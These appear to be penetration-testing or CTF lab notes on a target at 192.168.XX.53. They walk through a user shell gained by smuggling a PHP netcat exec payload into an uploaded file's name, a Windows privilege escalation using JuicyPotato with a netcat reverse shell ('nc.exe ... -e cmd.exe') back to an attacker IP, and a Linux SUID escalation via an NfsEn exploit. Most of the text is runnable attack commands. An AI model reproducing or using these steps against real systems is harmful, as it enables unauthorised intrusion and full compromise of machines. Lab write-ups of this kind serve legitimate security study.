# Webshell LFI RFI
Exploit to Getting User
1. Port 8787 is an http service
2. Check robots.txt and you should get a hidden directory
3. Credential admin:admin
4. Follow https://www.exploit-db.com/exploits/42003 and upload a CSV file
5. Capture the POST request using Burp and edit the file name to <?php echo exec(‘nc -lvnp
9000 > shell.php 2>&1’); ?>.php
6. In your local machine, transfer the shell.php to target machine by running nc -nv 192.168.XX.53
9000 < shell.php
7. Start a netcat listener to your machine and browse
http://192.168.XX.53:8787/2315e8131432505230f581cf689e783a/shell.php
8. User shell!

# Win Priv Esc 
## Potato
Privilege Escalation to Root
1. Machine is using a Windows 10 Pro and the SeImpersonatePrivilege is enabled.
2. Download JuicyPotato - https://github.com/ohpe/juicy-potato
3. Upload a netcat binary to target machine and run the command:
echo C:\Users\Rob\Desktop\nc.exe 192.168.123.123 12345 -e cmd.exe > rev.bat
4. Setup netcat listener in your local machine
5. Go to https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro and copy a CLSID
6. Run JuicyPotato.exe -l 12345 -p C:\Users\Rob\Desktop\rev.bat -t * -c
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
7. Root shell!

# Linux Priv Esc
## SUID
Privilege Escalation to Root
1. Run Linux Enumeration and you should find SUID named NfsEn
2. Check for its version because it is vuln to https://github.com/patrickfreed/nfsen-exploit
3. Root shell!
